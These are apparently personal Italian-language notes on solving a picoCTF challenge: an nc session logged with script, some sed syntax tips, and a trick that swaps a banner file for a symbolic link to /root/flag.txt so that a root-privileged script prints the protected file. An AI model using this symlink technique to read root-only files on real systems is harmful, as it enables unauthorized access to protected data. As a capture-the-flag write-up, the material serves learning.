script -c "nc tethys.picoctf.net 60434" log.txt && sed -i '1d;$d' log.txt




^^^^^ questo e' il comando per semplificare il piu' possibile
o meglio, cosi' si impara qualche nuova sintassi


sed -i '1i nuova riga'
per inserire una nuova riga (sha-bang ad esempio!)

PROCEDIMENTO



sn -l "/root/flag.txt" banner



come funziona?
il server una volta acceduto legge il file banner
navigando nel fs si trova il file del comando, che non si puo' leggere pero'...

COME FACCIAMO?
possiamo utilizzare un link simbolico!
lo script avviato avra' privilegi di root! e leggera' il link simbolico
e lo stampera' come header di accesso al server ;)
